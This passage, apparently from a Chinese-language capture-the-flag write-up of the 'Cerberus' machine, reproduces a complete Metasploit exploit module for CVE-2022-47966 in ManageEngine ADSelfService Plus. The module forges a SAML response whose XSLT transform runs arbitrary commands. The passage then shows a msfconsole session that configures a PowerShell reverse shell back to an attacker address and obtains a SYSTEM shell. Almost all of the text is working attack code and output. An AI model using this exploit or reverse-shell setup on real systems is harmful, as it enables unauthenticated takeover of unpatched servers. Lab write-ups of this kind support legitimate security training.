  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ManageEngine ADSelfService Plus Unauthenticated SAML RCE',
        'Description' => %q{
          This exploits an unauthenticated remote code execution vulnerability
          that affects Zoho ManageEngine AdSelfService Plus versions 6210 and
          below (CVE-2022-47966). Due to a dependency to an outdated library
          (Apache Santuario version 1.4.1), it is possible to execute arbitrary
          code by providing a crafted `samlResponse` XML to the ADSelfService Plus
          SAML endpoint. Note that the target is only vulnerable if it has been
          configured with SAML-based SSO at least once in the past, regardless of
          the current SAML-based SSO status.
        },
        'Author' => [
          'Khoa Dinh', # Original research
          'horizon3ai', # PoC
          'Christophe De La Fuente' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2022-47966'],
          ['URL', 'https://blog.viettelcybersecurity.com/saml-show-stopper/'],
          ['URL', 'https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/'],
          ['URL', 'https://github.com/horizon3ai/CVE-2022-47966'],
          ['URL', 'https://attackerkb.com/topics/gvs0Gv8BID/cve-2022-47966/rapid7-analysis']
        ],
        'Payload' => {
          'BadChars' => "\x27"
        },
        'Targets' => [
          [
            'Windows EXE Dropper',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :windows_dropper,
              'DefaultOptions' => { 'Payload' => 'windows/x64/meterpreter/reverse_tcp' }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :windows_command,
              'DefaultOptions' => { 'Payload' => 'cmd/windows/powershell/meterpreter/reverse_tcp' }
            }
          ]
        ],
        'DefaultOptions' => {
          'RPORT' => 9251,
          'SSL' => true
        },
        'DefaultTarget' => 1,
        'DisclosureDate' => '2023-01-10',
        'Notes' => {
          'Stability' => [CRASH_SAFE,],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        },
        'Privileged' => true
      )
    )

    register_options([
      OptString.new('TARGETURI', [ true, 'The SAML endpoint URL', '/samlLogin' ]),
      OptString.new('GUID', [ true, 'The SAML endpoint GUID' ]),
      OptString.new('ISSUER_URL', [ true, 'The Issuer URL used by the Identity Provider which has been configured as the SAML authentication provider for the target server' ]),
      OptString.new('RELAY_STATE', [ false, 'The Relay State. Default is "http(s)://<rhost>:<rport>/samlLogin/LoginAuth"' ])
    ])
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'], datastore['GUID'])
    )
    return CheckCode::Unknown unless res

    return CheckCode::Safe unless res.code == 200

    product = res.get_html_document.xpath('//title').first&.text
    unless product == 'ADSelfService Plus'
      return CheckCode::Safe("This is not ManageEngine ADSelfService Plus (#{product})")
    end

    CheckCode::Detected
  end

  def encode_begin(real_payload, reqs)
    super

    reqs['EncapsulationRoutine'] = proc do |_reqs, raw|
      raw.start_with?('powershell') ? raw.gsub('$', '`$') : raw
    end
  end

  def exploit
    case target['Type']
    when :windows_command
      execute_command(payload.encoded)
    when :windows_dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, _opts = {})
    if target['Type'] == :windows_dropper
      cmd = "cmd /c #{cmd}"
    end
    cmd = cmd.encode(xml: :attr).gsub('"', '')

    assertion_id = "_#{SecureRandom.uuid}"
    # Randomize variable names and make sure they are all different using a Set
    vars = Set.new
    loop do
      vars << Rex::Text.rand_text_alpha_lower(5..8)
      break unless vars.size < 3
    end
    vars = vars.to_a
    saml = <<~EOS
      <?xml version="1.0" encoding="UTF-8"?>
      <samlp:Response
        ID="_#{SecureRandom.uuid}"
        InResponseTo="_#{Rex::Text.rand_text_hex(32)}"
        IssueInstant="#{Time.now.iso8601}" Version="2.0" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
        <samlp:Status>
          <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
        </samlp:Status>
        <Assertion ID="#{assertion_id}"
          IssueInstant="#{Time.now.iso8601}" Version="2.0" xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
          <Issuer>#{datastore['ISSUER_URL']}</Issuer>
          <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
            <ds:SignedInfo>
              <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
              <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
              <ds:Reference URI="##{assertion_id}">
                <ds:Transforms>
                  <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                  <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
                    <xsl:stylesheet version="1.0"
                      xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
                      xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                      <xsl:template match="/">
                        <xsl:variable name="#{vars[0]}" select="rt:getRuntime()"/>
                        <xsl:variable name="#{vars[1]}" select="rt:exec($#{vars[0]},'#{cmd}')"/>
                        <xsl:variable name="#{vars[2]}" select="ob:toString($#{vars[1]})"/>
                        <xsl:value-of select="$#{vars[2]}"/>
                      </xsl:template>
                    </xsl:stylesheet>
                  </ds:Transform>
                </ds:Transforms>
                <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
                <ds:DigestValue>#{Rex::Text.encode_base64(SecureRandom.random_bytes(32))}</ds:DigestValue>
              </ds:Reference>
            </ds:SignedInfo>
            <ds:SignatureValue>#{Rex::Text.encode_base64(SecureRandom.random_bytes(rand(128..256)))}</ds:SignatureValue>
            <ds:KeyInfo/>
          </ds:Signature>
          <Subject>
            <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">matthew@cerberus.local</NameID>
          </Subject>
        </Assertion>
      </samlp:Response>
    EOS

    relay_state_url = datastore['RELAY_STATE']
    if relay_state_url.blank?
      relay_state_url = "http#{'s' if datastore['SSL']}://#{rhost}:#{rport}/samlLogin/LoginAuth"
    end
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], datastore['GUID']),
      'vars_get' => {
        'RelayState' => Rex::Text.encode_base64(relay_state_url)
      },
      'vars_post' => {
        'SAMLResponse' => Rex::Text.encode_base64(saml)
      }
    })

    unless res&.code == 200
      fail_with(Failure::Unknown, "Unknown error returned (HTTP code: #{res&.code})")
    end

    res
  end

end
```

设置好参数获得 Administrator。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ msfconsole
Metasploit tip: Enable HTTP request and response logging with set HttpTrace
true


  Metasploit Park, System Security Interface
  Version 4.0.5, Alpha E
  Ready...
  > access security
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
  access: PERMISSION DENIED....and...
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!


       =[ metasploit v6.4.124-dev                               ]
+ -- --=[ 2,633 exploits - 1,328 auxiliary - 1,710 payloads     ]
+ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use exploit/multi/http/adssp_saml_v2
[*] Using configured payload cmd/windows/powershell/meterpreter/reverse_tcp
msf exploit(multi/http/adssp_saml_v2) > show options

Module options (exploit/multi/http/adssp_saml_v2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   GUID                          yes       The SAML endpoint GUID
   ISSUER_URL                    yes       The Issuer URL used by the Identity Provider which has been configured as the SAML authe
                                           ntication provider for the target server
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni,
                                           socks4, socks5, socks5h, http
   RELAY_STATE                   no        The Relay State. Default is "http(s)://<rhost>:<rport>/samlLogin/LoginAuth"
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-m
                                           etasploit.html
   RPORT        9251             yes       The target port (TCP)
   SRVSSL       true             no        Negotiate SSL/TLS for local server connections
   SSL          true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI    /samlLogin       yes       The SAML endpoint URL
   URIPATH                       no        The URI to use for this exploit (default is random)
   VHOST                         no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machi
                                       ne or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/windows/powershell/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows Command



View the full module info with the info, or info -d command.

msf exploit(multi/http/adssp_saml_v2) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf exploit(multi/http/adssp_saml_v2) > set RPORT 9251
RPORT => 9251
msf exploit(multi/http/adssp_saml_v2) > set SSL true
SSL => true
msf exploit(multi/http/adssp_saml_v2) > set VHOST dc.cerberus.local
VHOST => dc.cerberus.local
msf exploit(multi/http/adssp_saml_v2) > set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
GUID => 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
msf exploit(multi/http/adssp_saml_v2) > set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
ISSUER_URL => http://dc.cerberus.local/adfs/services/trust
msf exploit(multi/http/adssp_saml_v2) > set RELAY_STATE https://dc.cerberus.local:9251/samlLogin/LoginAuth
RELAY_STATE => https://dc.cerberus.local:9251/samlLogin/LoginAuth
msf exploit(multi/http/adssp_saml_v2) > set AutoCheck false
AutoCheck => false
msf exploit(multi/http/adssp_saml_v2) > set payload cmd/windows/powershell_reverse_tcp
payload => cmd/windows/powershell_reverse_tcp
msf exploit(multi/http/adssp_saml_v2) > set LHOST 10.10.16.151
LHOST => 10.10.16.151
msf exploit(multi/http/adssp_saml_v2) > set LPORT 4448
LPORT => 4448
msf exploit(multi/http/adssp_saml_v2) > run
[*] Started reverse TCP handler on 10.10.16.151:4448
[!] AutoCheck is disabled, proceeding with exploitation
[*] Powershell session session 1 opened (10.10.16.151:4448 -> 10.129.232.100:54996) at 2026-11-04 01:44:11 -0500

PS C:\Program Files (x86)\ManageEngine\ADSelfService Plus\bin> whoami
nt authority\system
PS C:\Program Files (x86)\ManageEngine\ADSelfService Plus\bin> exit

[*] 127.0.0.1 - Powershell session session 1 closed.  Reason: User exit
msf exploit(multi/http/adssp_saml_v2) > exit
```
